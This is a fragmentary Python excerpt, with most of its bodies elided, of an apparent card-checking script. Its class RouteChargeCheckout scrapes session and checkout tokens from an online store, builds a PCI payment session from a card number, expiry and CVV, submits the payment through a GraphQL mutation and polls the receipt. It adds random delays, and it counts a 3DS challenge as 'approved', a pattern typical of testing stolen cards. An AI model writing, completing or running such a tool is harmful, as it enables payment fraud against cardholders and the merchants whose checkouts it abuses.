...
# ========== ROUTE CHARGE CHECKOUT CLASS (FIXED WITH PROPER AUTHENTICATION) ==========
class RouteChargeCheckout:
    ...
    async def get_initial_session(self):
        ...
        try:
            ...
            # Extract client ID and session token from cookies
            ...
            if resp.status_code == 200:
                try:
                    ...
                    if self.cart_token:
                        self.logger.data_extracted("Cart Token", self.cart_token[:20] + "...")
                except:
                    pass
            
            self.logger.data_extracted("Client ID", self.client_id[:20] + "...")
            self.logger.data_extracted("Visit Token", self.visit_token[:20] + "...")
            return True
    ...
    async def get_checkout_token_direct(self):
        """
        Step 2: Go directly to checkout page and extract token
        This replaces get_product_page and get_checkout_token
        """
        self.step(2, "DIRECT CHECKOUT ACCESS", "Going directly to checkout page")
        ...
        for idx, checkout_url in enumerate(self.checkout_urls):
            try:
                self.logger.step(2, "DIRECT CHECKOUT ACCESS", f"Trying checkout URL {idx+1}: {checkout_url}", "", "INFO")
                ...
                if self.checkout_token:
                    self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", f"Checkout URL {idx+1}")
                    ...
                    self.logger.step(2, "DIRECT CHECKOUT ACCESS", f"Failed with URL {idx+1}", "No token found", "WARNING")
    ...
    async def extract_checkout_metadata(self):
        """Step 3: Extract all required metadata from checkout page"""
        self.step(3, "EXTRACT METADATA", "Extracting tokens from checkout page")
        ...
        try:
            ...
            if self.signed_handles:
                self.logger.data_extracted("Signed Handles", f"{len(self.signed_handles)} found")
            
            # Construct GraphQL session token
            self.graphql_session_token = self.construct_graphql_session_token()
            if self.graphql_session_token:
                self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token[:20] + "...")
    ...
    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 4: Create PCI payment session with proper signature"""
        self.step(4, "CREATE PCI SESSION", "Creating payment session with PCI")
    ...
    async def submit_for_completion(self, payment_session_id):
        """Step 5: Submit for completion with proper GraphQL mutation"""
        self.step(5, "SUBMIT PAYMENT", "Submitting payment with GraphQL mutation")
    ...
    async def poll_for_receipt(self, receipt_id):
        """Step 6: Poll for receipt status"""
        self.step(6, "POLL RECEIPT", f"Polling for receipt: {receipt_id}")
        ...
        for poll_attempt in range(20):
            try:
                ...
                if typename == 'ProcessedReceipt':
                    ...
                    # 3DS required - still considered approved
                    self.logger.step(6, "3DS REQUIRED", "Action required - 3DS authentication needed")
    ...
    async def execute_checkout(self, cc, mes, ano, cvv):
        ...
        try:
            ...
            # Step 2: Direct checkout access
            success, result = await self.get_checkout_token_direct()
            if not success:
                return False, result
            await self.random_delay(0.1, 0.2)
            
            # Step 3: Extract checkout metadata
            if not await self.extract_checkout_metadata():
                return False, "Failed to extract checkout metadata"
            await self.random_delay(0.1, 0.2)
            
            # Step 4: Create PCI session
            success, payment_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_id
            await self.random_delay(0.1, 0.2)
            
            # Step 5: Submit for completion
            success, result = await self.submit_for_completion(payment_id)
            if not success:
                return False, result
            receipt_id = result
            await self.random_delay(0.1, 0.2)
